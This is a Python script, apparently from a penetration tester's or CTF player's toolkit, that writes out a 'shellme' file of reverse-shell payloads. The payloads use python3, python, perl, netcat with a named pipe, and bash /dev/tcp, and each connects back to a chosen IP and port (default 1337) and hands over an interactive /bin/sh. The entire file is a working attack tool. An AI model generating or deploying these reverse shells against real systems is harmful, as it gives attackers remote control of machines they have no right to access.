#!/usr/bin/python3

from string import Template
import os
import sys
import subprocess
import argparse

parser = argparse.ArgumentParser(description='Generate a shellme file')

parser.add_argument("-p", "--port", type=int, default=1337)
parser.add_argument("-d", "--device", type=str, default='tun0')
parser.add_argument("-i", "--ip", type=str, required=False)
parser.add_argument("-path", "--path", type=str, required=False)

args = parser.parse_args()

def do_shell(ip, port, path):
    shell_template = Template("""
if command -v python3 > /dev/null 2>&1; then
	python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",$port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
fi

if command -v python > /dev/null 2>&1; then
	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",$port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v perl > /dev/null 2>&1; then
	perl -e 'use Socket;$i="$ip";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f
	exit;
fi

if command -v sh > /dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/$ip/$port 0>&1
	exit;
fi
        """)
    path = os.path.join(path, 'shellme')
    data = shell_template.substitute(ip=ip, port=port, i='$i', p='$p')
    with open(path, 'w') as f:
        f.write(data)
    print('File created at: {}'.format(path))

if __name__ == '__main__':
    if args.ip == None:
        ipcmd = "getmyip.sh"
        sp = subprocess.Popen([ipcmd, args.device], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        sp_out,sp_err = sp.communicate()
        sp.wait()
        ip = sp_out.strip().decode()
        if sp.returncode == 1:
            ip = None
    else:
        ip = args.ip
    
    if args.path == None:
        path = os.getcwd() + '/'
    else:
        path = args.path
   
    if ip == None:
        print('Could not obtain IP address, aborting ...')
    else:        
        do_shell(ip, args.port, path)

